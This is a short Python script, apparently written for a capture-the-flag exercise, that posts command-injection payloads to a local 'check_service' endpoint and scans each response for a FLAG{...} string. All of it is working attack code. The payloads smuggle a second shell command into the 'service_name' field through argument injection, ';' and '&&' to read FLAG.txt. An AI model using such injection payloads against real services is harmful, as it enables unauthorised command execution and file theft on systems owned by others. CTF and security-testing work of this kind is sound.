import requests
import re
import time

url = "http://127.0.0.1:32844/check_service"

# Try different payload variations
payloads = [
    {"service_name": "-t custom cat<FLAG.txt"},
    {"service_name": "-t custom cat FLAG.txt"},
    {"service_name": "-t custom;cat FLAG.txt"},
    {"service_name": "-t custom && cat FLAG.txt"}
]

for i, payload in enumerate(payloads):
    print(f"\n[{i+1}] Trying payload: {payload}")
    try:
        resp = requests.post(url, json=payload, timeout=5)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
        
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"\n[!] FLAG FOUND: {flags[0]}")
            break
    except requests.exceptions.Timeout:
        print("Timeout")
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(1)

